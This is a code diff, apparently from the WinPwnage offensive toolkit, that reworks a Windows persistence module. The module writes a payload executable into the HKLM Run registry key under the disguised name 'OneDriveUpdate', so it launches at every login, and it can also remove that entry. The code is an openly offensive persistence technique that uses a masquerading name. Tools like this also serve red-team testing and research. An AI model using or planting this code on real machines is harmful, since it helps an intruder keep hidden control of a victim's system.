@@ -1,5 +1,3 @@
-import os
-import _winreg
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
@@ -15,37 +13,30 @@ hklmrun_info = {
 }
 
 
-def reg_create(path,name,payload):
-	try:
-		key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, os.path.join(path, name), 0, _winreg.KEY_ALL_ACCESS)
-		_winreg.SetValueEx(key, name, 0, _winreg.REG_SZ, payload)
-		_winreg.CloseKey(key)
-	except Exception as error:
+def hklm_run(payload, name='OneDriveUpdate', add=True):
+	if not information().admin():
+		print_error("Cannot proceed, we are not elevated")
 		return False
+
+	if "64" in information().architecture():
+		kpath = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
 	else:
-		return True
+		kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
-
-def hklm_run(payload):
-	if payloads().exe(payload):
-		if information().admin():
-			if "64" in information().architecture():
-				if reg_create("Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "OneDriveUpdate", payload):
-					print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
-					print_success("Successfully installed persistence, payload will run at login")
-				else:
-					print_error("Unable to install persistence")
-					return False
+	if add:
+		if payloads().exe(payload):
+			if registry().modify_key(hkey="hklm", path=kpath, name=name, value=payload):
+				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payload))
+				print_success("Successfully installed persistence, payload will run at login")
 			else:
-				if reg_create("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "OneDriveUpdate", payload):
-					print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
-					print_success("Successfully installed persistence, payload will run at login")
-				else:
-					print_error("Unable to install persistence")
-					return False
+				print_error("Unable to install persistence")
+				return False
 		else:
-			print_error("Cannot proceed, we are not elevated")
+			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		print_error("Cannot proceed, invalid payload")
-		return False
+		if registry().remove_key(hkey="hklm", path=kpath, name=name):
+			print_success("Successfully removed persistence")
+		else:
+			print_error("Unable to remove persistence")
+			return False
